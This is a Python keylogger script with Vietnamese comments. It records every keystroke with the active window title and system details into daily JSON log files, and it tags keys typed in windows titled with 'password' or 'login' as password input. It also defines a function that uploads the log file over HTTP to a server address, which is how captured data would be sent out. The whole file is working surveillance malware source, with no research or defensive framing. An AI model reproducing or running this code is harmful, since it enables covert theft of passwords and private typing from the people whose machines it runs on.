from pynput.keyboard import Key, Listener
import os
import datetime
import pygetwindow as gw
import json
import platform
import requests
import logging

# Đường dẫn tuyệt đối tới file log theo ngày
log_file_path = os.path.expanduser(
    r'~\Downloads\Python\tool\key-logger\log_' + datetime.datetime.now().strftime('%Y-%m-%d') + '.json'
)



# Hàm format thời gian cho log
def get_timestamp():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Hàm đảm bảo thư mục tồn tại
def ensure_log_directory_exists():
    log_directory = os.path.dirname(log_file_path)
    if not os.path.exists(log_directory):
        os.makedirs(log_directory)

# Hàm lấy tên ứng dụng đang hoạt động
def get_active_window_title():
    try:
        active_window = gw.getActiveWindow()
        if active_window is not None:
            return active_window.title
        return "Unknown Window"
    except Exception as e:
        return "Error getting window title"

# Hàm gửi file log về máy chủ
def send_log(file_path):
    url = 'http://192.168.2.172:5000/upload'  
    try:
        with open(file_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(url, files=files)
            if response.status_code == 200:
                print("Log file sent successfully.")
            else:
                print("Failed to send log file.")
    except Exception as e:
        print(f"Error sending log file: {e}")

# Hàm lấy thông tin hệ thống
def get_system_info():
    return {
        "OS": platform.system(),
        "Release": platform.release(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }

# Hàm xử lý các phím nhấn
def on_press(key):
    # Bản đồ các phím đặc biệt
    key_map = {
        Key.enter: '[ENTER]',
        Key.space: '[SPACE]',
        Key.backspace: '[BACKSPACE]',
        Key.shift: '[SHIFT]',
        Key.esc: '[ESC]',
        Key.tab: '[TAB]',
        Key.alt_l: '[ALT]',
        Key.ctrl_l: '[CTRL]',
        Key.f12: '[EXIT]'  # Phím F12 để thoát chương trình
    }

    # Xử lý phím nhấn
    if key in key_map:
        mapped_key = key_map[key]
        if mapped_key == '[EXIT]':
            # Thêm thông tin thời gian kết thúc phiên trước khi thoát
            log_summary()
            raise SystemExit(0)  # Thoát chương trình khi nhấn F12
    else:
        # Xử lý các phím khác, chuyển đổi ký tự cho dễ đọc
        try:
            mapped_key = key.char  # Lấy ký tự từ phím nhấn
        except AttributeError:
            mapped_key = str(key).replace("'", "")  # Xóa dấu nháy

    # Lấy tên ứng dụng hiện tại
    active_window = get_active_window_title()

    # Xác định nếu đó là một trường mật khẩu
    if 'password' in active_window.lower() or 'login' in active_window.lower():
        mapped_key = f"[PASSWORD] {mapped_key}"  # Đánh dấu phím là mật khẩu

    # Ghi log với timestamp, tên ứng dụng và thông tin hệ thống
    log_entry = {
        "timestamp": get_timestamp(),
        "window": active_window,
        "key": mapped_key,
        "system_info": get_system_info()
    }
    try:
        with open(log_file_path, 'a', encoding='utf-8') as file:
            json.dump(log_entry, file)
            file.write('\n')
    except Exception as e:
        print(f"Error writing to log file: {e}")

    # In ra màn hình để kiểm tra (có thể tắt đi khi cần)
    print(f"{get_timestamp()} - {active_window} - {mapped_key}")

# Hàm ghi tóm tắt cuối phiên
def log_summary():
    summary_entry = {
        "summary": "Session Ended",
        "timestamp": get_timestamp(),
        "system_info": get_system_info()
    }
    try:
        with open(log_file_path, 'a', encoding='utf-8') as file:
            json.dump(summary_entry, file)
            file.write('\n')
    except Exception as e:
        print(f"Error writing summary to log file: {e}")

# Hàm ghi thời gian bắt đầu phiên mới
def start_new_session():
    ensure_log_directory_exists()
    with open(log_file_path, 'a', encoding='utf-8') as file:
        session_start_entry = {
            "session": "Session Started",
            "timestamp": get_timestamp(),
            "system_info": get_system_info()
        }
        json.dump(session_start_entry, file)
        file.write('\n')

# Gọi hàm ghi thời gian bắt đầu
start_new_session()

# Lắng nghe các phím nhấn
with Listener(on_press=on_press) as listener:
    listener.join()
